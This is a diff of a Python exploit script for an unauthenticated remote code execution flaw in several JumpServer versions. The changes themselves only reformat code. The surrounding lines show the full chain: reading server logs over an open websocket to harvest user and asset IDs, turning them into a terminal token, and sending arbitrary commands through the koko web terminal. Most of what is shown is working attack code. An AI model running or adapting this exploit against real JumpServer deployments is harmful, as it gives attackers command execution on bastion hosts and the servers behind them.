@@ -20,24 +20,23 @@
 
 
 import argparse
+import asyncio
+import copy
+import json
+import logging
+import re
+import ssl
+from datetime import datetime
+from urllib.parse import urlparse, parse_qs
 
 import requests
 import websockets
-import json
-import logging
-import ssl
-import asyncio
-from datetime import datetime
-from urllib.parse import urlparse,parse_qs
-import copy
-import re
 
-logging.basicConfig(level=logging.INFO,format="%(asctime)s | %(name)s | [%(levelname)s]: %(message)s")
+logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(name)s | [%(levelname)s]: %(message)s")
 basicLogger = logging.getLogger('exploit')
 readLogLogger = logging.getLogger('remotelog')
 stage2Logger = logging.getLogger('stage2')
 stage3Logger = logging.getLogger('stage3')
-
 
 # ----- DO NOT CHANGE, POST ---[BLOCK START]---
 PATH_PAYLOAD_1 = '/ws/ops/tasks/log/'
@@ -48,7 +47,7 @@ REFERER_PAYLOAD_2 = '/luna/?_={tms}'.format(tms=str(int(datetime.timestamp(datet
 GLOBAL_HEADERS = {
     'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
 }
-GLOBAL_TIMEOUT=5
+GLOBAL_TIMEOUT = 5
 
 # Stage 3, HTTP, Switching to WS
 PATH_PAYLOAD_3 = '/koko/ws/token/?target_id={tid}'
@@ -61,12 +60,13 @@ PATH_PAYLOAD_3 = '/koko/ws/token/?target_id={tid}'
 PAYLOAD_1 = '{"task":"/opt/jumpserver/logs/gunicorn"}'
 RETRYCOUNT_THRESHOLD = 500  # This is the max number of frames received from WS Logging stream
 # If after RETRYCOUNT_THRESHOLD frames, the related data still cannot be found, it will get stuck.
-COUNT_THRESHOLD = 10    # This is the number of assets id retrieve threshold AT LEAST, it seems that should not need to change
+COUNT_THRESHOLD = 10  # This is the number of assets id retrieve threshold AT LEAST, it seems that should not need to change
 # seems that the program either has bug or unknown reason, only tracked the 13?-latest log lines.
 # If it CANNOT find enough number of COUNT_THRESHOLD assets, it will get stuck.
 
 # Stage 2
 PATH_PAYLOAD_2_USE = PATH_PAYLOAD_2
+
 
 # MAIN PROGRAM START HERE, DON'T CHANGE
 
@@ -121,7 +121,7 @@ class BasicInfo(object):
         else:
             raise RuntimeError("Internal Function Error. Contact Author.")
 
-    def setattr(self,name,value):
+    def setattr(self, name, value):
         self.__setattr__(name, value)
 
 
@@ -159,7 +159,7 @@ async def runWS_stream(url, ssl, payload):
                     finalurl += '\r\n'
                     count += 1
                     readLogLogger.info("Assets Processing Done. Wait for next assets or jump out...")
-                if count > COUNT_THRESHOLD-1 or retrycount > RETRYCOUNT_THRESHOLD:
+                if count > COUNT_THRESHOLD - 1 or retrycount > RETRYCOUNT_THRESHOLD:
                     break
             except:
                 pass
@@ -181,7 +181,7 @@ async def runWS_rce(url, ssl, payload):
         # init terminal tty
         stage3Logger.debug("INIT TERMINAL")
         currcmd["type"] = "TERMINAL_INIT"
-        currcmd["data"] = json.dumps({"cols":125,"rows":35})
+        currcmd["data"] = json.dumps({"cols": 125, "rows": 35})
         await wsapp.send(json.dumps(currcmd))
         # recv 5 msg
         pingmsg = ""
@@ -199,7 +199,8 @@ async def runWS_rce(url, ssl, payload):
         currcmd["type"] = "TERMINAL_DATA"
         currcmd["data"] = payload + "\r\n"
         stage3Logger.info("Code Execution Done! Receiving reply...")
-        stage3Logger.warning("This program cannot recognize the end of reply, if you see the response you need, just ^C to kill it.")
+        stage3Logger.warning(
+            "This program cannot recognize the end of reply, if you see the response you need, just ^C to kill it.")
         await wsapp.send(json.dumps(currcmd))
         # execute done
         # recv 50 resp
@@ -224,7 +225,8 @@ class STEP1(object):
         selectedurl = dtlist[selected_user]
         keyid = parse_qs(urlparse(selectedurl, scheme='http').query)
         try:
-            keydata = {"user": keyid['user_id'][0], "system_user": keyid['system_user_id'][0], "asset": keyid['asset_id'][0]}
+            keydata = {"user": keyid['user_id'][0], "system_user": keyid['system_user_id'][0],
+                       "asset": keyid['asset_id'][0]}
             self.upper.setattr('payload2_post', keydata)
         except:
             raise ValueError("Token not found.")
@@ -249,7 +251,7 @@ class STEP2(object):
 
 
 class STEP3(object):
-    def __init__(self,upper):
+    def __init__(self, upper):
         self.upper = upper
 
     def run(self):
@@ -260,8 +262,10 @@ class STEP3(object):
 
 
 def __main__():
-    parser = argparse.ArgumentParser(description="JumpServer v1.5.9~2.4.5 v2.5.x~v2.5.4 v2.6.x~v2.6.1 Unauthenticated RCE")
-    parser.add_argument("host", default="http://127.0.0.1:8080", type=str, help="JumpServer Location (http[s]://IP Addr:PORT)")
+    parser = argparse.ArgumentParser(
+        description="JumpServer v1.5.9~2.4.5 v2.5.x~v2.5.4 v2.6.x~v2.6.1 Unauthenticated RCE")
+    parser.add_argument("host", default="http://127.0.0.1:8080", type=str,
+                        help="JumpServer Location (http[s]://IP Addr:PORT)")
     args = parser.parse_args()
     basicLogger.warning("Note: If you use SSL, Cert Verification is disabled.")
     basicLogger.debug("User Offered Connection Info:", args.host)
@@ -274,6 +278,7 @@ def __main__():
     action2.run()
     action3 = STEP3(binfo)
     action3.run()
+
 
 if __name__ == '__main__':
     __main__()
